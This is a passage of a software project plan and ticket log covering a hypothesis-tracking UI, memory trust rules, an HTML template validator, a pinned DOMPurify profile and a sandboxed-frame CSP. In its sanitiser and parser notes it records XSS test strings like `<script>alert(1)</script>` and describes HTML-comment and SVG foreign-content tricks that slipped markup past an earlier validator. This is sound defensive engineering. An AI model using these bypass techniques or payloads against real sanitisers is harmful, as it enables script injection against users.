  arithmetic — W4 computed it all.
- **Repo:** agent-wolf
- **Files:** create `web/src/pages/HypothesisDetail.tsx`, `web/src/components/Scoreboard.tsx`,
  `web/src/components/MetricChart.tsx`, `web/src/components/Timeline.tsx`,
  `web/src/components/ConditionTable.tsx`, and a `.test.tsx` beside each; modify
  `web/src/App.tsx` (replace W13's `/hypotheses/:id` placeholder route — the file is shared with
  W13 and W24, strictly serial).
- **The shapes it reads, all pinned in § "Shared shapes that four or more tickets must agree on":**
  `EvaluationResult` (`evaluated_at_ms`, `support_score`, `conditions[]`, `metrics[]` with
  `direction` / `realised_change_pct` / `last_observation_ms` / `stale` / `stale_reason`), and
  `Point = { tMs: UnixMs; v: number }` for series. Timestamps ending `_ms` are unix
  **milliseconds**; the embed token's `expires_at_sec` is the only seconds value in the UI.
- **Acceptance criteria:**
  - `ConditionTable` renders, per condition: the condition id, its metric, its state, the computed
    `value`, the `threshold`, the window (`window_start`–`window_end`), and
    `observations_in_window`. **`indeterminate` is visually distinct from `holding`** — not merely
    a different label, a different colour treatment — because "we could not tell" must never read
    as "it is fine". The word is `indeterminate` throughout; never "unknown".
  - An `indeterminate` row shows W4's `reason` verbatim, enumerated: `stale_series`,
    `non_positive_reference`, `insufficient_coverage`, `no_observations`. A reason W4 emits that is
    not in that list renders verbatim rather than being dropped — a silently blank reason is how a
    spec mistake (a percentage statistic on a zero-crossing series) stays invisible.
  - 🔴 **CORRECTED IN REVISION 5 — staleness has ONE authority, and it is not this ticket.**
    `EvaluationResult.metrics[]` already carries `stale: boolean` and `stale_reason: Reason | null`,
    computed by W4 — Wolf's own evaluator — and **that is the authority** for the condition table and
    the scoreboard. Two definitions in two places disagree the first time the series route returns
    points newer than the last evaluation. The client-side rule below survives for **exactly one
    job**: deciding whether `MetricChart` draws its hatched region, with `never_fetched` from the
    series route distinguishing "never written" from "the last tick failed".
    For that one job: a metric is stale when its series response
    carries `never_fetched`, or when `Date.now() - lastPoint.tMs > staleness_days * 86_400_000`
    (the spec-level `staleness_days`, default 5). `MetricChart` then shows the last known points
    plus a hatched trailing region and a caption reading exactly one of `never fetched` /
    `no update since <date>`. Never a flat line to today, never a silent gap.
  - **Status and staleness never come from Orange's delivery status.** A delivery parked at
    `awaiting_human` never clears — a known Orange wart — so status comes from the trusted
    `hypothesis` memory and staleness from the series/evaluation payloads. A test asserts the
    component renders correctly from a payload carrying no delivery information at all.
  - Every metric shows its expected `direction` from the spec beside its `realised_change_pct`, so
    "expected down, moved up" is readable at a glance.
  - `support_score` is labelled as a summary and carries an explicit note that **it decides
    nothing — only conditions do**. Asserted on the rendered text, because this sentence is the
    difference between a scoreboard and a verdict.
  - **A `challenged` hypothesis shows, and no other state does:** the reason
    (`condition_tripped` | `horizon_reached`) taken from the trusted `hypothesis` memory's
    snapshot; the evaluation snapshot's **tripped-condition rows** (metric, statistic, value,
    threshold, window, observation count); and the **three most recent `kind=research-note`
    memories**, under a heading naming them as the agent's untrusted evidence, not a
    recommendation. There is no separately generated "the agent's case" artefact — no ticket
    produces one, and nothing wakes the researcher when a condition trips.
  - Both verdict buttons appear only in `challenged`. Confirming or invalidating requires a
    rationale and the submit control stays disabled until one is entered; a test asserts an empty
    and a whitespace-only rationale are both refused client-side.
  - **Amendment actions post the pinned body:** `POST /api/hypotheses/:id/amend` with
    `{ amendment_id, decision: "accept" | "reject", rationale }`, where `amendment_id` is the
    Orange memory id of the `kind=spec-amendment` row, carried by the detail response as
    `amendments: [{ id, proposed_at_ms, content }]`. A test asserts the exact request body — two
    executors shipping `"accept"` vs `"accepted"` both pass their own mocked tests and the UI 400s
    the first time a human clicks Accept.
  - Proposals render **as proposals**, labelled untrusted; accepting is what makes the change
    trusted, and the UI says so.
  - `Timeline` renders, newest first by `created_at_ms`: state changes from the `hypothesis`
    memories, `research-note`s, `spec-amendment`s and the `verdict`. Every row is labelled trusted
    or untrusted per § "Memory kinds" — the trust boundary is the product, so it is visible.
  - `MetricChart` plots `Point[]` with a UTC-formatted axis and does not interpolate across gaps.
  - 🔴 **REWRITTEN IN REVISION 5 — this ticket now ships the TWO-COLUMN SHELL** (UI design § 5).
    The previous wording ("compose above the condition table **without restructuring it**") is
    withdrawn: the page is a left column carrying every Wolf-owned region and scrolling normally,
    beside the sticky full-height conversation rail W13 built. W23's `VerdictBand` and `ReportPanel`
    compose into the **top of the left column**; the condition table is still unchanged by W23.
    A test asserts the rail is a sibling of the scrolling column, not a child of it.
  - **The report panel needs an explicit height and must never negotiate one.** Default
    `clamp(480px, 70vh, 900px)` with internal scroll, plus an **expand** control opening a
    full-viewport dialog that renders **the same frame component**, same CSP, same sandbox.
    🔴 **No `postMessage`-driven resize, asserted by test.** A frame with `sandbox="allow-scripts"`
    and no `allow-same-origin` can still `postMessage` its parent; honouring a height from it would
    let model-authored content set Wolf's layout, and a report asking for `40000px` pushes the
    verdict buttons off the screen. **Layout is not negotiable by untrusted content.**
- **TDD:** yes for the condition/reason rendering, the staleness rule, the verdict gate, the
  `challenged`-only block and the amend request body; no for layout.
- **Validation:**
  - `cd web && yarn test && yarn typecheck` — confirm vitest reports **0 skipped**
  - `cd web && yarn build` — `tsc -p tsconfig.json && vite build`: it typechecks the whole tree
    and proves the page compiles into the production bundle, neither of which `vitest run` does
    (esbuild strips types without checking them)
- **Depends on:** W13, **W28** *(the trust channels; revision 5)*
- [x] done — verified 2026-08-24, one fix round. Merged to agent-wolf `main` as `fe2edfc`; main gated green after (web **31 files / 347 tests**, api **32 / 1020**, 0 skipped, both typechecks clean, `yarn build` clean).
- Notes: Implemented `67639ec`, fix round `65cab84`. Its verifier ran **94 independent mutations and caught 87** — the largest mutation pass in the project — and re-ran every Validation command itself. **The two assertions most likely to be fake were both proved honest by attacking the test rather than the code:** it moved the `postMessage` spy to `document` and watched the self-check go red, so "no listener was registered" is not vacuous; and it **physically moved `<ChatRail>` inside the scrolling column** (rather than deleting a comment, which is how the implementer's own first attempt at that mutation escaped) and the sibling test failed. **Seven mutations escaped; six were closed in the fix round and each re-run red**, the seventh being untested layout the ticket exempts. Two were the R133 class — `NEVER_FETCHED_CAPTION` and `REASON_NOT_SERVED` asserted through the *imported constant*, so the assertion moved with the bug while the literal appeared only in the test's title; note the sibling caption `no update since <date>` **was** literal-pinned, so this was an inconsistency rather than a habit. One was consequential: the page's `statFor` join was untested, so joining by **index** instead of condition id stayed green, and `stat ?? "—"` could be mutated to `stat ?? "level"` — a statistic Wolf invented rendering as though it had been recorded. 🔴 **`ReportFrameHost` mounted its child TWICE** (boxed and in the expand dialog, the boxed copy never unmounted) — closed with `{expanded ? null : children}` plus an instance-count test using a real sandboxed iframe, so W23 inherits a guarantee rather than a hazard. **Two criteria are BLOCKED at the API wire and both were handled honestly rather than faked** — see **R143**. **The implementer logged 59 guesses**; the load-bearing ones are `src/format.ts` (one UTC formatter) and `src/reasons.ts` (one gloss table for W4's reasons), both of which W23 and W24 must reuse rather than duplicate. Four components beyond the ticket's four were created (`VerdictActions`, `ChallengedCase`, `AmendmentList`, `ReportFrameHost`), each carrying a TDD'd behaviour that deserved its own suite; all are on the ownership table now. Also fixed two gate gaps it found from opposite sides (**R144**, **R145**).


### W15: Report vocabulary, trusted-kind set, and the store reads   [Status: done | Model: opus]
- **Scope:** The four memory kinds as types and label builders, the corrected trusted-kind rule,
  the full-content Orange reads the frame route needs, and the store functions that read templates
  and reports. No routes, no rendering, no sanitising.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/kinds.ts`, `api/src/report/kinds.test.ts`; modify
  `api/src/hypothesis/store.ts`, `api/src/hypothesis/store.test.ts`, `api/src/orange/client.ts`,
  `api/src/orange/client.test.ts`.
- **Acceptance criteria:**
  - `TRUSTED_KINDS` is an exported frozen set containing exactly `hypothesis`, `hypothesis-spec`,
    `verdict`, `evaluation`, `report-template` — **enumerated, never counted**. A test asserts
    membership for all five and non-membership for `report`, `report-candidate`,
    `report-amendment`, `research-note` and `spec-amendment`.
  - `isTrusted()` applies **all three** clauses of the main plan's rule: empty provenance, kind in
    `TRUSTED_KINDS`, and `name` matching an existing `hyp-<id>` session. A test asserts a memory
    passing only the first two is **not** trusted.
  - Parsing a `kind=report` memory splits line 1 (headline) from the JSON body; a body that is not
    a flat `Record<string,string>` is a typed `invalid` error naming the offending key.
  - A headline longer than **400 characters** is truncated on read at a character boundary. *(The
    snippet limit is 500 **characters**, not bytes — `substring(content,1,500)` in Postgres is
    character-based, `go/agentdb/memories.go:451-452` — so a mid-multibyte split is not
    constructible and no test should claim to construct one.)*
  - A `report-template` memory with **non-empty provenance** is rejected as forged, reusing W5's
    helper rather than reimplementing the check.
  - `client.getMemoryById(id)` and `client.getCurrentMemory(name, kind)` return **full content**,
    not snippets. A test asserts a >600-character body round-trips whole.
  - `store.readTemplate(id)` and `store.readLatestReport(id)` exist and are the only paths by which
    later tickets obtain either. Both use `include_retracted=1` and **ignore any retraction whose
    own provenance is non-empty**, exactly as W5 does — a template hidden by a hostile retraction
    must surface as `tamper`, never as absence.
  - **Three defects in `api/src/orange/client.ts` that earlier tickets each found and each declined
    to fix, because the file was not theirs.** W15 is the next holder of it in the serial order and
    is the last chance before W10's poller consumes all three (added 2026-08-21 — collecting
    standing assignments, not new scope):
    1. **`classifyStatus` has no case for 401**, so an Orange 401 becomes kind `internal` with the
       status preserved. W8 needed verify-google's 401 to read as `forbidden` and detected it by
       `err.status === 401` in its own route rather than editing this file. Add the case; any other
       caller that branches on `kind` currently mis-handles a 401.
    2. **The port-pool override builds kind `unavailable` carrying the UPSTREAM status**, so it
       produces `unavailable` with HTTP **403**, contradicting the taxonomy's `unavailable → 503`.
       W8 restates it to 503 in its create route and left the client alone. **W10's poller will see
       the 403** and, per § "Shared error taxonomy", `unavailable` is the one retryable kind — a
       mismatched status here is how a retry loop mis-reads an outage.
    3. **`mapMemorySearchRow` fails OPEN on missing provenance**: a row that OMITS
       `created_by_worker`/`created_by_session` entirely is mapped to empty strings, so it satisfies
       clause 1 of the trust rule and reads as **trusted**. Not reachable through today's `agentd`
       (`agentdb.MemorySearchResult` tags both without `omitempty`, `go/agentdb/memories.go:133-134`,
       so they are always emitted) — but it is the one place where the trust rule depends on a field
       being **present** rather than on its value, and the defence cannot be mounted from
       `store.ts`: by the time the store sees the row the distinction is gone. W5 found it and named
       W15 as the owner. Reject the shape, or carry the distinction through.
    A test drives each of the three.
- **TDD:** yes.
- **Validation:** `cd api && yarn test src/report/kinds src/hypothesis/store src/orange/client && yarn typecheck`
- **Depends on:** W5, O11
- [x] done — verified 2026-08-21, 16/16 criteria, zero defects, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 16 of 16 criteria PASS, zero
  defects, zero fix rounds.** Branch `W15-report-vocabulary-store-reads`, commit `9fa06d8`, merged
  to `main`. api/ 586 → **644 tests**. `kinds.ts` **re-exports** W5's trust primitives rather than
  redeclaring them (R48), pinned by **object identity** — `isTrusted === store.isTrusted` and five
  more — plus a source scan proving no second enumeration of the kind strings exists in the file.
  `TRUSTED_KINDS` is asserted by membership for all five and non-membership for all five named
  non-members, with **no `.size` assertion anywhere**, so the test cannot pass against the wrong
  five. `readTemplate` and `readLatestReport` both read with `include_retracted=1`, honour a
  retraction only when its **own** provenance is empty, and surface a hostile retraction as
  `Tamper{hostile_retraction}` **while still serving the row** — so a template hidden by an attack
  never reads as absence, which is the failure shape W5's verifier already caught once on the board
  path. Both return `{ template|report, tamper }` so "absent" and "attacked" stay distinguishable.
  **The three standing `client.ts` defects are closed**: 401 now classifies as `forbidden` (status
  preserved, so W8's `err.status === 401` branch is untouched); the port-pool override builds
  `unavailable` at status **503** with Orange's message verbatim and the upstream 403 kept in
  `details`; and all three memory mappers now require provenance to be **present**, closing the
  fail-open that let a row omitting both fields read as trusted. `getMemory` survives as a
  deprecated alias so `routes/hypotheses.ts`, which this ticket does not own, keeps compiling.
  **A notable piece of honesty:** the `report_kinds_import_cycle` test does **not** gate the TDZ
  hazard it describes — vitest's SSR transform rewrites ESM imports into lazy accessors, so a
  top-level cross-cycle read still passes. The executor confirmed this by injecting one and
  watching the suite stay green, verified the real behaviour out of tree with `tsc --outDir` and
  node, and rewrote the test's comment to state the limit rather than overclaiming. That is the
  Validation rule applied to a test the executor wrote itself. 26 guesses.
  Found **R104**, **R105**, **R106**, **R107**.
### W16: Template parser, structure hash, and the report config   [Status: done | Model: opus]
- **Scope:** `parseTemplate` — slot extraction, fragment-shape validation, https-only enforcement,
  size limit, structure hashing. Plus the two config variables this feature introduces.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/template.ts`, `api/src/report/template.test.ts`; modify
  `api/src/config.ts`, `.env.example`, `docker-compose.yml` (**R81/R110** — `WOLF_REPORT_MAX_BYTES`
  and `WOLF_SERIES_MAX_POINTS` need an `environment:` entry too, or they never reach the container).
- **Acceptance criteria:**
  - `parseTemplate(html, maxBytes)` takes the limit as a **parameter**; it reads no config itself.
  - `WOLF_REPORT_MAX_BYTES` (default 512000) and `WOLF_SERIES_MAX_POINTS` (default 5000) are added
    to `api/src/config.ts`, documented in `.env.example`, **and given an `environment:` entry in
    `docker-compose.yml`** (R81) **by this ticket**, because W16 is the first consumer. Both are
    read through `present()` (R80), so an unset variable falls back to its default rather than
    coercing `""` to `0`. W21 must not re-add them.
  - Slot ids are extracted from `[data-wolf-slot]` in document order. A **duplicate slot id is a
    validation error**, not last-wins: two regions sharing an id makes drift undetectable.
  - A slot id must match `^[a-z][a-z0-9-]{0,31}$`; anything else is an error naming the id.
  - **The template is a FRAGMENT.** A `<!doctype>`, `<html>`, `<head>` or `<body>` element is a
    validation error — `composeFrame` owns the document skeleton.
  - **Every `src` and `href` must be `https:`.** `http:`, protocol-relative `//host`, and
    `javascript:` are each a distinct error message. `data:` is permitted on `img` only.
  - `structureHash` is `sha256` of the **stored bytes with no normalisation whatsoever**,
    lowercase hex. *(An earlier draft called for whitespace normalisation. That is wrong and was
    removed: whitespace inside a `<script>` body is semantically significant, so normalising would
    let two templates with different chart code hash identically — making the lock forgeable.)*
  - A template with no `[data-wolf-fallback]` element is a validation error: a CDN failure is
    invisible inside an opaque frame, so the fallback is the operator's only signal.
  - A template exceeding `maxBytes` is an error naming both the limit and the actual size.
  - `scriptSrcs` lists every external script and stylesheet URL, for the go-live review screen.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/report/template src/config && yarn typecheck`
  - Confirm the vitest summary reports **2 test files**. ⚠️ **The single-path form of this command
    was an authoring defect, corrected 2026-08-22 after W16's verifier caught it.**
    `yarn test src/report/template` runs exactly one file, and that file touches neither
    `config.ts`, `.env.example` nor `docker-compose.yml` — so acceptance criterion 2 (the two
    variables, in three places, through `present()`) was gated by nothing at all, and `yarn
    typecheck` compiles rather than exercises. The `src/config` leg is what reaches it, including
    the **R81/R110** cross-check block (**R111**), which must be **passing and unmodified** — a
    ticket that edits that block to make itself pass has committed a blocking defect.
- **Depends on:** W15
- [x] done
- Notes: **Wave 6 phase B, 2026-08-22 — passed after TWO fix rounds, the wave's hardest ticket.**
  `19f39ab` → `734d1e5` → `992ba8e`; 6 files, +2033. Both fix rounds closed a **parser
  differential**, and both were found the same way: the verifier wrote a 42-case differential test
  against **parse5** (already in `node_modules`) asserting *"if a real parser builds an element with
  a non-https fetchable URL, `parseTemplate` MUST refuse"*. Reading the scanner would not have found
  either.
  **Round 1 — comment closes.** `scan()` closed an HTML comment only on the literal `-->`. The
  tokenizer closes one in four ways: `-->`, `<!-->` and `<!--->` (abrupt-closing-of-empty-comment)
  and `--!>` (comment end bang state). Everything between an unmodelled close and the next literal
  `-->` was markup to a browser and **invisible to the validator** — defeating four criteria at once
  (https-only, fragment-only, duplicate-slot, and the `scriptSrcs` go-live list) with a 5–6
  character payload.
  **Round 2 — foreign content.** `style`, `title`, `textarea`, `xmp`, `noembed` and `noframes` were
  treated as raw text unconditionally, but inside `<svg>`/`<math>` the tree builder never switches
  the tokenizer, so markup inside `<svg><style>…</style></svg>` was invisible while a browser builds
  real elements from it. `scan()` now tracks foreign content, a self-closing `<svg/>` opens nothing,
  an inner `</svg>` does not close an outer one, and an unclosed root is handled.
  Verified on merged `main`: 157 template cases, 57 config cases, 887 in `api/` overall. The
  **R81/R110 enforcer is byte-identical** — `git diff da49393..HEAD -- api/src/config.test.ts` is
  **68 insertions, 0 deletions** — and all four of its cases pass. Four **minor** defects stand,
  recorded as **R118**.

## The slot sanitiser profile, pinned as an ALLOW list

> **Pinned 2026-08-22 to close R116.** W17 copies `SLOT_PROFILE` from here byte-for-byte and a test
> asserts `ALLOWED_TAGS` and `ALLOWED_ATTR` equal these literals, so a later widening is a
> deliberate, visible act rather than a diff nobody reads. **Widening this list is an owner
> decision.** If a report genuinely needs something absent from it, the answer is almost always
> that the thing belongs in the *template* — which is reviewed at go-live and frozen by
> `structureHash` — and not in a slot, which is filled daily by a model nobody reviews.
>
> **This profile was executed against `isomorphic-dompurify ^2` before being pinned**, not reasoned
> about — which is how the two defects recorded in **R120** were found. W17 should re-run that
> corpus rather than trust this note.

```ts
export const SLOT_PROFILE = {
  ALLOWED_TAGS: [
    // ⚠️ `#text` and `KEEP_CONTENT: true` DEFEND THE SAME FAILURE AND MOVE
    // TOGETHER — do not delete either because the other makes it look inert.
    // DOMPurify treats an explicit ALLOWED_TAGS list as exhaustive INCLUDING
    // text nodes, so with `KEEP_CONTENT: false` omitting `#text` strips every
    // character of prose while leaving the elements standing:
    // `<p class="lead">Gold <strong>rose</strong> 4%.</p>` sanitises to
    // `<p class="lead"><strong></strong></p>`, every report renders empty, and
    // no test that only checks "the dangerous token is absent" would notice.
    // ⚠️ With `KEEP_CONTENT: true` — which this profile sets — the library
    // adds `#text` itself (`dompurify/dist/purify.cjs.js:916`), so removing
    // `#text` TODAY changes nothing and mutation-testing it reddens only the
    // literal pin. That inertness is the trap: an editor who deletes it now
    // re-opens a blocking defect the moment anyone revisits `KEEP_CONTENT`,
    // which looks like the safer setting. Measured all four combinations,
    // W17, 2026-08-26 — see R146. R120(1) was observed against the pre-R120(2)
    // draft, where `KEEP_CONTENT` was still `false`; this entry corrects the
    // rationale, not the value. Proved against isomorphic-dompurify ^2.
    "#text",
    "p", "br", "hr", "span", "div", "section",
    "strong", "em", "b", "i", "u", "s", "small", "mark",
    "code", "pre", "kbd", "samp", "var", "sub", "sup",
    "abbr", "dfn", "q", "blockquote", "cite", "time",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "ul", "ol", "li", "dl", "dt", "dd",
    "table", "caption", "thead", "tbody", "tfoot", "tr", "th", "td",
  ],
  ALLOWED_ATTR: [
    "class", "title", "lang", "dir",
    "datetime", "colspan", "rowspan", "scope", "headers",
  ],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  USE_PROFILES: false,
  WHOLE_DOCUMENT: false,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false,
  RETURN_TRUSTED_TYPE: false,
  SANITIZE_DOM: true,
  KEEP_CONTENT: true,
  FORBID_CONTENTS: ["script", "style", "template", "noscript", "title", "textarea", "xmp"],
  // ⚠️ ADDED 2026-08-26 by owner ruling, and it is a VISIBILITY fix, not a
  // safety one — the output was already safe without it. Without `FORCE_BODY`,
  // DOMPurify parses slot content in document context and returns only
  // `<body>` (`WHOLE_DOCUMENT: false`), so content that BEGINS with `<script>`,
  // `<style>`, `<link>`, `<meta>`, `<base>`, `<title>` or `<template>` is
  // hoisted into `<head>` by the PARSER and never reaches the sanitiser at all.
  // It is discarded — but `strippedCount` is then **0**, so the worst possible
  // slot in the product (`<script>alert(1)</script>` alone) renders as an empty
  // region with NO degraded-severity notice, because W23 gates that notice on
  // `stripped_count > 0`. `FORCE_BODY` prefixes a throwaway element to push the
  // parser into body mode: output is unchanged, counting becomes correct.
  // See R147. W17 measured the gap and declined to close it unilaterally,
  // which was right — this is a byte-for-byte pinned profile.
  FORCE_BODY: true,
} as const;
```

**Why each of the non-obvious entries is there.** These are the lines a later reader is most likely
to "simplify", so the reason is recorded next to each:

- **`img`, `a`, `src`, `href` and `style` are absent, and that is the point.** No URL survives a
  slot. A remote `src` in a slot would be a **daily, human-unreviewed egress channel** inside a
  frame whose whole design is that nothing untrusted reaches the network. Every URL a report needs
  lives in the template, where a human approved it once and `structureHash` froze it.
- **`id` is absent.** Slot content that could set an `id` could shadow elements the template's own
  script looks up — a template that does any `getElementById` at all, which charting code routinely
  does, can be fed a decoy by the daily tick. `[data-wolf-fallback]` is the same hazard in the
  attribute namespace and is already covered by `ALLOW_DATA_ATTR: false` below. `class` is enough
  for styling. *(An earlier draft justified this by naming a specific id the template supposedly
  reads. **No such id is defined anywhere in this plan** — it was invented by the section that was
  meant to pin the interface, which is the exact failure R116 exists to prevent. Removed; the
  general argument above is the real one, and the series contract remains W25's
  `window.__WOLF_SERIES__` and nothing else.)*
- **`ALLOW_DATA_ATTR: false`.** DOMPurify permits `data-*` by default. Left on, a tick could emit
  `data-wolf-slot="…"` **inside a slot** and manufacture a phantom slot region — which W20 would
  then report as drift on a healthy report, or which would nest a slot inside a slot. The attribute
  namespace that names our own machinery must not be writable by the content that machinery holds.
- **`ALLOW_ARIA_ATTR: false`.** Tight beats broad in a locked profile, and the template — reviewed,
  frozen — is where accessible structure belongs. Revisit only with a concrete report that needs it.
- **`USE_PROFILES: false` and no `svg`/`math` in `ALLOWED_TAGS`.** Foreign content is where W16's
  second blocking defect lived (**R119**): inside `<svg>`/`<math>` the HTML tree builder does not
  switch the tokenizer, so raw-text assumptions stop holding and a browser builds real elements out
  of what a scanner reads as text. Slots need no graphics — charts come from the template — so the
  cheapest correct answer is that foreign content never enters a slot at all.
- **`KEEP_CONTENT: true`, with `FORBID_CONTENTS` doing the actual work.** The concern is real —
  DOMPurify's default keeps the *text* of a removed element, so `<script>alert(1)</script>` would
  otherwise render the literal `alert(1)` to a human as though it were analysis — but
  `KEEP_CONTENT: false` is the **wrong instrument** for it and an earlier draft of this section got
  that wrong. Measured against isomorphic-dompurify ^2: with `false`, a slot written as
  `<article><p>some analysis</p></article>` sanitises to the **empty string**, because one wrapper
  element the model happened to reach for takes the whole day's analysis with it, silently. With
  `true` the same input yields `<p>some analysis</p>` — the wrapper is dropped, the prose survives —
  and `<a href="https://x">link</a>` yields `link`, which is exactly right: the text stays, the URL
  does not. `FORBID_CONTENTS` is what suppresses the dangerous case: with it,
  `<script>alert(1)</script>` yields `""` under **both** settings, and
  `<p>before</p><script>alert(1)</script><p>after</p>` yields `<p>before</p><p>after</p>`.
- **`ALLOW_UNKNOWN_PROTOCOLS: false`.** With no URL-bearing attribute allowed this is belt and
  braces, and belt and braces is correct on the one boundary the whole feature rests on.

**What W17 must still prove, because a config literal is not a guarantee.** The profile is
necessary and not sufficient: W17's vector table, its idempotence check and its mutation-XSS
regressions are what demonstrate the library applies the profile the way we think it does. A test
that asserts only `SLOT_PROFILE` equals this literal has tested our typing, not our sanitiser.

---

## HTTP routes added

> **Authored 2026-08-26 to close R154.** W21's Scope cites this section by name and it did not
> exist: the revision-4 fold moved `2026-08-21-agent-wolf-report-layer.md`'s *tickets* into the `W`
> series and left its *reference* sections behind. What follows is that document's § of the same
> name, corrected against the code as merged. The superseded copy is not a source of truth.

```
GET  /api/hypotheses/:id/report/frame
       → 200 text/html, the document `composeFrame` returned
         Content-Security-Policy: the value `composeFrame` DERIVED for this template
         X-Content-Type-Options: nosniff
         and NO Set-Cookie
       → 404 when no locked template exists, with a body the UI distinguishes from a
             server error (an empty state, not a blank frame)

POST /api/hypotheses/:id/report-template     { html }
       → 201 { structure_hash }              writes kind=report-template, status=locked
       → 422 { errors: [{ path, message }] } template failed validation
       → 409                                 a locked template already exists; use an amendment

POST /api/hypotheses/:id/report-amendment    { amendment_id, decision, rationale }
       → 200                                 accepting re-validates, then writes a NEW
                                             kind=report-template
       → 422                                 the proposed template failed validation, and
                                             NO template is written
```

Four notes the route author needs and the old copy did not carry:

1. 🔴 **The CSP is a HEADER and only a header.** `composeFrame` deliberately emits no
   `<meta http-equiv="Content-Security-Policy">`, and a test pins that. A meta policy silently
   ignores `sandbox` and `frame-ancestors` — two of the four directives `default-src` does not
   cover — so a meta copy reads as a second line of defence while being neither. `sandbox` in the
   CSP is the entire reason direct navigation to this URL is safe; the iframe attribute does
   nothing there.
2. 🔴 **`composeFrame` returns `{html, csp, strippedCount, strippedBySlot}` from ONE call.** Take
   the CSP from that return value; do not call `frameCsp` a second time and do not re-derive it.
   And **read `strippedCount` from here rather than sanitising again** — a second `sanitiseSlot`
   pass produces a second number that can disagree with the document actually served.
3. 🔴 **The version-gated cache key must include the template's `structureHash`, not only the
   dataset versions.** The dataset version lives inside the series payload; an accepted amendment
   changes the template and no dataset, so a version-only key keeps serving the old frame for ever.
4. `422` and `409` are `invalid` and `conflict` in § "Shared error taxonomy". A validation failure
   is never `internal`, and a template that already exists is never `invalid`.

`POST /api/hypotheses` and `GET /api/hypotheses/:id` are **amended, not added** — the detail route's
addition is the next section, and its writer is W22.

## The detail route's report block, pinned

> **Authored 2026-08-26 to close R154**, from the superseded doc's § of the same name, reconciled
> with `api/src/report/drift.ts` and `api/src/routes/hypotheses.ts` as merged. W22 cites this
> section by name.

Wire JSON is snake_case throughout and units live in the field names, per § Vocabulary:

```json
"report": {
  "has_template": true,
  "structure_hash": "9f2c…",
  "stripped_count": 0,
  "updated_at_ms": 1789000000123,
  "drift": { "orphan_slots": ["stale-slot"], "unfilled_slots": [] },
  "tamper": null
}
```

- **`has_template` is the first field because it is the gate.** Per
  `design/2026-08-24-agent-wolf-ui.md` § 6b, W24's Go Live button is enabled iff
  `spec_validation.valid && report.has_template`, and **W22 owns the server-side `422` backstop**.
  W9 is never reopened for this.
- 🔴 **`stripped_count`'s SIGN is the contract; its MAGNITUDE is not.** It counts DOMPurify
  *records* — nodes **and** attributes — so a library upgrade moves the number without anything
  being wrong. W23 renders `> 0` as a degraded-severity notice and must be magnitude-agnostic. It
  is also why `<p onclick="alert(1)">` matters: that removes no element, so a node-only counter
  would report a live XSS attempt as "nothing was removed".
- **`drift` is `null` when no `kind=report` memory exists at all** — the empty state, which is
  **not** drift and must stay distinguishable from `{orphan_slots: [], unfilled_slots: []}` (a tick
  that matched the template exactly). W20 built that distinction deliberately; `drift.ts`'s
  `DriftResult = SlotDrift | null` is the shape, and its field names are `orphanSlotIds` /
  `unfilledSlotIds` in TS and `orphan_slots` / `unfilled_slots` on the wire.
- **`tamper`** is the pinned `Tamper` shape from § "Shared shapes that four or more tickets must
  agree on", carrying at least one provenance field (R89).
- `updated_at_ms` is unix **milliseconds** — the memory table's unit, not the `agent_*` tables'
  seconds.

## The CSP header, byte-for-byte

> 🔴 **AMENDED 2026-08-26 — THE STRING BELOW IS NO LONGER THE POLICY. It is the SKELETON'S ANCESTOR
> and this section's per-clause rationale; it is not what any route emits.** Revision 5 made the
> origin list **derived from the approved template**, and W19 then split it into **two** lists.
> The live value is `design/2026-08-24-agent-wolf-ui.md` § 6b **as amended**, and its per-directive
> reasoning is the rest of this section, which remains accurate.
>
> **What is dead below, precisely:**
> - The `script-src 'unsafe-inline' https:` / `style-src … https:` / `img-src https: data:` /
>   `font-src https: data:` clauses. Substituted, per § 6b: `<CODE>` (the `https:` entries of
>   `scriptSrcs`) into `script-src`/`style-src`, `<ORIGINS>` (`remoteOrigins`) into
>   `img-src`/`font-src`. A template referencing nothing remote now yields `script-src
>   'unsafe-inline'` with **no host at all**.
> - The banner's own sentence, *"W19 asserts this exact string as a literal and W21 asserts the
>   route emits it"* — **both halves are false.** W19 asserts the skeleton with two lists
>   substituted, over a five-row table; W21 asserts that two templates with different origins
>   produce **different** headers, so a route emitting a constant policy fails.
> - § "What is deliberately still reachable"'s claim that *"`script-src` and `style-src` permit
>   **any** `https:` origin"*, and its recorded gap (b) that a pinned CDN allowlist *"is not done
>   now"*. **It is done, as of W19.**
>
> Everything else here — the two decisions, why `'unsafe-inline'` stays, the four directives
> `default-src` does not cover, the serving requirements — is current and is why the policy has the
> shape it does.
>
> *This banner exists because the verifier found this section still claiming to be the pinned
> literal while § 6b claimed otherwise — **R130 recurring inside the main plan itself**, four days
> after R130 was raised against the companion document. Logged as **R157**.*

> **Pinned 2026-08-22 to close R116.** *(Superseded — see the banner above.)*

```
sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline' https:; style-src 'unsafe-inline' https:; img-src https: data:; font-src https: data:; connect-src 'none'; form-action 'none'; frame-ancestors 'self'; frame-src 'none'; child-src 'none'; object-src 'none'; base-uri 'none'; manifest-src 'none'; media-src 'none'; worker-src 'none'
```

⚠️ **Four directives here are NOT covered by the `default-src` fallback and must be written out, which
is why they appear despite `default-src 'none'`:** `sandbox`, `base-uri`, `form-action` and
`frame-ancestors`. Deleting any of them as "redundant" silently removes the protection.
`frame-ancestors 'self'` in particular was **missing from an earlier draft of this section**: the
frame route is authenticated, so without it any third-party page could embed a signed-in user's
report. The rest (`script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `frame-src`,
`child-src`, `object-src`, `manifest-src`, `media-src`, `worker-src`) *do* fall back to `default-src`
and are listed explicitly so the intent is readable at the point of use rather than inferred.

### The two decisions inside it

**1. `sandbox allow-scripts`, and deliberately no `allow-same-origin`.** The sandbox lives in the
*CSP*, not only in the iframe attribute, because the frame has a real URL a person can paste into
an address bar: `GET /api/hypotheses/:id/report/frame`. An `iframe sandbox=` attribute does nothing
on direct navigation, and X1's **direct-navigation leg** exists precisely to catch a regression back
to that. The pair `allow-scripts allow-same-origin` **cancels the sandbox** — that is the mistake
`docs/19-embedding.md` records as hazard **H3** in Orange's own UI — so `allow-same-origin` must
